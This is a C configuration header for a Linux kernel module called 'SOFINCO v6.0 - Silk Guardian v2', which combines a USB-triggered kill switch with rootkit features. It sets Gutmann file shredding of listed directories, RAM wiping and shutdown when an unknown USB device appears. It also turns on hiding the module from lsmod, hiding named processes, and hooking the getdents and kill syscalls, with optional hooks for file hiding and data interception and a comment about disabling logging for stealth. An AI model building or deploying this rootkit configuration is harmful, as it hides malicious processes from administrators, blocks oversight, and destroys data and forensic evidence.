// SOFINCO v6.0 - Silk Guardian v2 - Configuration Header

#ifndef SILK_CONFIG_H
#define SILK_CONFIG_H

// ============================================
// SHREDDING CONFIGURATION
// ============================================

// Number of shred iterations (DoD: 3, Gutmann: 35)
#define shredIterations "35"

// Files to shred on USB threat detection
static char *remove_files[] = {
    "/home/user/sensitive/",
    "/root/secrets/",
    "/tmp/",
    NULL  // Must end with NULL
};

// ============================================
// RAM WIPING
// ============================================

// Enable RAM wiping (requires sdmem from secure-delete package)
#define WIPE_RAM

#ifdef WIPE_RAM
static char *sdmem_argv[] = {
    "/usr/bin/sdmem",
    "-v",
    NULL
};
#endif

// ============================================
// SHUTDOWN BEHAVIOR
// ============================================

// Use orderly shutdown (safer) vs immediate power off
#define USE_ORDERLY_SHUTDOWN

// ============================================
// USB WHITELIST
// ============================================

// Whitelisted USB devices (Vendor:Product ID)
// Example: 0x1234:0x5678 for specific device
static struct usb_device_id whitelist_table[] = {
    // Add your trusted devices here
    // { USB_DEVICE(0x1234, 0x5678) },  // Example device
    { }  // Terminator
};

// ============================================
// ROOTKIT CONFIGURATION
// ============================================

// Hide module from lsmod by default
#define AUTO_HIDE_MODULE 1

// Hide processes by default
#define AUTO_HIDE_PROCESSES 1

// Protected process names (will be hidden)
static const char *protected_processes[] = {
    "sofinco",
    "phantom",
    NULL
};

// ============================================
// SYSCALL HOOK CONFIGURATION
// ============================================

// Hook getdents/getdents64 (process hiding)
#define HOOK_GETDENTS 1

// Hook kill (process protection)
#define HOOK_KILL 1

// Hook open (file hiding)
#define HOOK_OPEN 0

// Hook read (data interception)
#define HOOK_READ 0

// ============================================
// LOGGING
// ============================================

// Enable kernel logging (disable for stealth)
#define ENABLE_LOGGING 1

// Log level (0=none, 1=errors, 2=info, 3=debug)
#define LOG_LEVEL 2

#endif // SILK_CONFIG_H
